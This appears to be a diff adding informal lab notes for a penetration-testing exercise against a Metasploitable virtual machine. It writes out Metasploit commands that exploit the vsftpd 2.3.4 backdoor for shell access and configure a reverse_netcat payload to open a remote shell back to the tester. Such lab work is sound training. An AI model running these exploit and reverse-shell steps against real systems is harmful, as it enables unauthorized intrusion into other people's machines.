@@ -1,0 +1,37 @@
+Task 1
+For this task we will be using metasploitable and metasploit.
+
+1) Launch Metasploitable environment. Login information: name: msfadmin; password: msfadmin.
+
+2)Check IP address of Metasploitable. Using command: ifconfig
+Here we need to ensure that settings of virtual box is correct. The network must be nat network.
+Note down the IP address, for example 10.0.2.15 . We will use that later.
+
+3)Open Kali, open Zenmap. We’ll use this to find vulnerabilities. The other option is to do it manually.
+Enter the IP address we got from the last step in the target blank. Then click scan.
+
+4)When scan is finished, we can a list of vulnerabilities of the system, but we will mainly talk about the ftp backdoor.
+The version is vsftpd_234_backdoor
+
+5)Then let’s exploit! Ref: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor
+Open metasploit in Kali.
+Enter the following commands:
+use exploit/unix/ftp/vsftpd_234_backdoor
+show targets(Doesn’t work!)
+show options
+set RHOST (IP address of Metasploitable)
+exploit
+ifconfig (If the ip address is the same with that of Metasploitable, we’re in that network, yeah!!)
+
+
+Task 2
+This task is to create an interactive shell via netcat, which means that we can listen to other computers.
+
+1)We need to use the IP address of metasploit environment this time.
+2)Ref: https://www.rapid7.com/db/modules/payload/cmd/unix/reverse_netcat
+Use following commands.
+show payloads
+use payload/cmd/unix/reverse_netcat
+show options(LHOST IP is empty)
+set LHOST (IP address of Metasploit)
+exploit
